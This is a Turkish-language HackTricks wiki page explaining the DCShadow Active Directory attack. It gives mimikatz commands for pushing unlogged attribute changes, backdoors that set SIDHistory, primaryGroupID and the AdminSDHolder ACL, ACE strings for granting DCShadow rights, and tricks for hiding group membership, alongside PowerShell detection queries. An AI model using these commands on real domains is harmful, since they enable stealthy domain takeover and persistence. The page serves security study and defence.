# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Temel Bilgiler

AD içinde **yeni bir Domain Controller** kaydeder ve bunu, belirtilen nesnelerde **öznitelikleri** (SIDHistory, SPN'ler...) **herhangi bir günlük** bırakmadan **push etmek** için kullanır; böylece **değişikliklerle** ilgili hiçbir **log** oluşmaz. **DA** ayrıcalıklarına sahip olmanız ve **root domain** içinde bulunmanız gerekir.\
Yanlış veriler kullanırsanız oldukça kötü logların ortaya çıkacağını unutmayın.<sup>[[2]](#references)</sup>

Saldırıyı gerçekleştirmek için 2 mimikatz örneğine ihtiyacınız vardır. Bunlardan biri SYSTEM ayrıcalıklarıyla RPC sunucularını başlatır (burada gerçekleştirmek istediğiniz değişiklikleri belirtmeniz gerekir), diğer örnek ise değerleri push etmek için kullanılır:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
`mimikatz1` session'ında **`elevate::token`** çalışmaz; çünkü thread'in ayrıcalıklarını yükseltir, ancak bizim **process'in ayrıcalığını** yükseltmemiz gerekir.\
Ayrıca bir "LDAP" object seçebilirsiniz: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Değişiklikleri bir DA veya aşağıdaki minimum permissions'a sahip bir user ile gönderebilirsiniz:

- **domain object** içinde:
- _DS-Install-Replica_ (Add/Remove Replica in Domain)
- _DS-Replication-Manage-Topology_ (Manage Replication Topology)
- _DS-Replication-Synchronize_ (Replication Synchornization)
- **Configuration container** içindeki **Sites object** (ve child'ları):
- _CreateChild and DeleteChild_
- DC olarak kayıtlı **computer object**:
- _WriteProperty_ (Write değil)
- **target object**:
- _WriteProperty_ (Write değil)

Ayrıcalıksız bir user'a bu permissions'ları vermek için [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) kullanabilirsiniz (bunun bazı log'lar bırakacağını unutmayın). Bu, DA permissions'larına sahip olmaktan çok daha kısıtlayıcıdır.\
Örneğin: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` Bu, _**mcorp-student1**_ machine'ında oturum açan _**student1**_ username'inin _**root1user**_ object'i üzerinde DCShadow permissions'larına sahip olduğu anlamına gelir.

## DCShadow Kullanarak backdoor'lar oluşturma
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps, and detection

- `primaryGroupID`, grubun `member` listesinden ayrı bir attribute'tur. DCShadow/DSInternals bunu doğrudan yazabilir (örneğin **Domain Admins** için `primaryGroupID=512` ayarlanabilir); on-box LSASS enforcement uygulanmaz. Ancak AD kullanıcıyı yine de **taşır**: PGID değiştirildiğinde önceki primary group üyeliği her zaman kaldırılır (hedef grup ne olursa olsun aynı davranış geçerlidir); bu nedenle eski primary-group üyeliğini koruyamazsınız.<sup>[[1]](#references)</sup>
- Varsayılan araçlar, bir kullanıcının mevcut primary group'undan çıkarılmasını engeller (`ADUC`, `Remove-ADGroupMember`); bu nedenle PGID değişikliği genellikle doğrudan directory write işlemleri gerektirir (DCShadow/`Set-ADDBPrimaryGroup`).
- Membership reporting tutarsızdır:
- **Primary-group kaynaklı üyeleri içerir:** `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **Primary-group kaynaklı üyeleri içermez:** `Get-ADGroup "Domain Admins" -Properties member`, `member` attribute'unu inceleyen ADSI Edit, `Get-ADUser <user> -Properties memberOf`.
- Primary group'un kendisi nested olduğunda recursive kontroller primary-group üyelerini gözden kaçırabilir (örneğin kullanıcının PGID'si **Domain Admins** içindeki nested bir grubu gösteriyorsa); `Get-ADGroupMember -Recursive` veya LDAP recursive filtreleri, primary group'ları açıkça çözümlemediği sürece bu kullanıcıyı döndürmez.
- DACL tricks: saldırganlar, çoğu PowerShell sorgusunda effective membership bilgisini gizlemek için kullanıcı üzerinde `primaryGroupID` için (veya AdminSDHolder kapsamındaki olmayan gruplarda grup `member` attribute'u üzerinde) **deny ReadProperty** uygulayabilir; `net group` üyeliği yine de çözümler. AdminSDHolder tarafından korunan gruplar bu deny ayarlarını sıfırlar.

Detection/monitoring örnekleri:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
Ayrıcalıklı grupları, `Get-ADGroupMember` çıktısını `Get-ADGroup -Properties member` veya ADSI Edit ile karşılaştırarak çapraz kontrol edin; böylece `primaryGroupID` veya gizli özniteliklerin neden olduğu tutarsızlıkları yakalayabilirsiniz.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow kullanarak DCShadow izinleri verme (değiştirilmiş izin günlükleri yok)

Aşağıdaki ACE'leri kullanıcımızın SID'siyle sona eklememiz gerekiyor:<sup>[[2]](#references)</sup>

- Etki alanı nesnesi üzerinde:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- Saldırgan bilgisayar nesnesi üzerinde: `(A;;WP;;;UserSID)`
- Hedef kullanıcı nesnesi üzerinde: `(A;;WP;;;UserSID)`
- Configuration container içindeki Sites nesnesi üzerinde: `(A;CI;CCDC;;;UserSID)`

Bir nesnenin mevcut ACE'sini almak için: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

Bu durumda yalnızca bir değil, **birkaç değişiklik** yapmanız gerekir. **`mimikatz1 session`** (RPC server) içinde her değişiklikle birlikte **`/stack` parametresini** kullanın. Ardından, sahte server'da stack'e alınan tüm değişiklikleri uygulamak için yalnızca bir kez **`/push`** kullanmanız gerekir.

[**ired.team üzerinde DCShadow hakkında daha fazla bilgi.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group Davranışı, Raporlama ve Exploitation Üzerine İncelemeler](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team üzerinde DCShadow yazısı](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
